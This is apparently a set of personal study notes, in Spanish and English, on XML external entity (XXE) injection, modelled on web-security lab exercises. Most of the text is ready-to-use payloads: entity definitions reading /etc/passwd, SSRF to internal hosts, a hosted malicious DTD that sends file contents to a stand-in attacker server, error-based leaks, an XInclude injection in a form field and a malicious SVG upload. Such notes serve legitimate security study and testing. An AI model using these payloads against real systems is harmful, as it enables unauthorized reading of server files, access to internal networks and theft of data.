
## XXE para pillar archvios

REQUEST ORIGINIAL:

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<stockCheck>
	<productId>381</productId>
</stockCheck>
```

EXPLOIT:

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
<stockCheck>
	<productId>&xxe;</productId>
</stockCheck>
```

## XXE para hacer SSRF

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```


## Detecting blind XXE using out-of-band (OAST) techniques

Para confirmar un XXE podríamos hacer que haga una petición a nuestro servidor :

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

si hay algún tipo de medida para que lo de arriba no se ejecute entonces tendremos que utilizar parameter entities :

```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

## Exploiting blind XXE to exfiltrate data out-of-band

utilizar tecnicas OAST confirma que hay vulnerabilidad pero no que se pueda explotar, para poder explotarla hay que hostearnos nuestro DTD y que el xml lo pille de nuestro server : 

DTD malicioso:

```
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>"> 
%eval; 
%exfiltrate;
```

ese DTD lo hosteamos en nuestro server malicioso :

```
http://web-attacker.com/malicious.dtd
```

y donde sea vulnerable a XXE tenemos que poner esto : 

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

## Exploiting blind XXE to retrieve data via error messages

En este caso buscamos que el XML nos de un error y que en ese error esté el contenido de /etc/passwd : 

```
<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; %error;
```

Aclaración : este payload es el dtd malicioso que hay que hostear en nuestra web, lo que se le pone a la request es : 

`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`


## Finding hidden attack surface for XXE injection


### XInclude attacks

Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document. An example of this occurs when client-submitted data is placed into a back-end SOAP request, which is then processed by the backend SOAP service.

Como no tenemos un xml entero no podremos usar DOCTYPE pero si XInclide

EXPLOIT:

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>
```

EJEMPLO:

una request normal:


```
productId=1&storeId=1
```

exploit:

```
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```


### XXE attacks via file upload

Si la web deja subir archivos SVG que son xml based podemos usarlo para hacer XXE

lo que va dentro del SvG:

```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

### XXE attacks via modified content type

Si la request acepta `text/xml` en su content type podriamos hacer XXE
